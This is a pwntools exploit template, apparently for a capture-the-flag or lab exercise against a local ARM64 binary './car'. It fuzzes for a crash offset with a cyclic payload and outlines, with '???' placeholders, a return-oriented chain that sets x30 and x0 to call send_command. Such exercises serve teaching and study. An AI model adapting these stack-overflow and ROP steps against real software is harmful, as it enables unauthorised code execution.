from pwn import *

binary = './car'
HOST   = '127.0.0.1'
PORT   = 1337

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary,checksec=False)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST,PORT)
    else:
        log.info('Did not specify GDB or REMOTE. Exiting')
        exit()

        
'''
0044afc4  e04f40f9   ldr     x0, [sp, #0x98 {var_28}]  {0x0}
0044afc8  fd7bcca8   ldp     x29, x30, [sp], #0xc0 {__saved_x29} {__saved_x30}
0044afcc  c0035fd6   ret

cmd = next(e.search(b'u\0')) # move (u)p
cmd = next(e.search(b'd\0')) # move (d)own
cmd = next(e.search(b'l\0')) # move (l)eft
cmd = next(e.search(b'r\0')) # move (r)ight
'''

p = start()

payload = cyclic(1337)

# payload = cyclic(???)     # Step 1: ??? = bytes until program crashes
# payload += p64(???)       # call car_server_connect()

                            # Step 2: call send_command(cmd) stage 2 payload
# payload += cyclic(???)    # padding
# payload += p64(???)       # gadget
# payload += cyclic(???)    # padding
# payload += p64(???)       # x30 = send_command
# payload += cyclic(???)    # padding
# payload += p64(???)       # x0 = cmd

p.sendline(payload)         # Step3: Profit

p.interactive()
